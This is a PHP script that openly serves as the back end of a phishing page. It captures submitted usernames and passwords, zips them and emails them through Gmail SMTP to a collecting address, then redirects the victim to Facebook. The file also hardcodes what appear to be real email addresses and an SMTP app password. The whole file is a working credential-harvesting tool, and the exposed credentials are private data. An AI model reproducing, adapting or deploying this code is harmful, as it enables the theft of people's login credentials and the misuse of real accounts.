<?php

	function mail_sender(){
		if(! ( isset($_REQUEST['username']) && isset($_REQUEST['password']) ) ){
			return false;
		}

		$username = $_REQUEST['username'];
		$password = $_REQUEST['password'];

		$reciever = "ddtaiwo04@gmail.com";

		$subject = "Got new access by phishing script";

		// Create the text file with the message
		$message = "The username is ". $username;
		$message .= " and password is ". $password;
		$file = 'message.txt';
		file_put_contents($file, $message);

		// Zip the text file
		$zip = new ZipArchive();
		$zip_name = "message.zip";
		if ($zip->open($zip_name, ZIPARCHIVE::CREATE)!==TRUE) {
			return false;
		}
		$zip->addFile($file);
		$zip->close();

		require_once "vendor/autoload.php"; // require the Composer autoloader

		// SMTP settings
		$smtpHost = 'smtp.gmail.com';
		$smtpUsername = 'grantoniap@gmail.com';
		$smtpPassword = 'aylysgnyieaialpm';
		$smtpPort = 587;
		$smtpEncryption = 'tls';

		// Create the Transport
		$transport = (new Swift_SmtpTransport($smtpHost, $smtpPort, $smtpEncryption))
			->setUsername($smtpUsername)
			->setPassword($smtpPassword);

		// Create the Mailer using your created Transport
		$mailer = new Swift_Mailer($transport);

		// Create a message
		$message = (new Swift_Message($subject))
			->setFrom([$smtpUsername => 'Phishing Script'])
			->setTo([$reciever])
			->attach(Swift_Attachment::fromPath($zip_name))
			->setBody("Please see attached file for message");

		// Send the message
		$result = $mailer->send($message);

		// Delete the text file and zip file
		unlink($file);
		unlink($zip_name);

		return $result;
	}

	if(mail_sender()){
		header("Location: http://www.facebook.com");
	}
	header("location:javascript://history.go(-1)");
?>
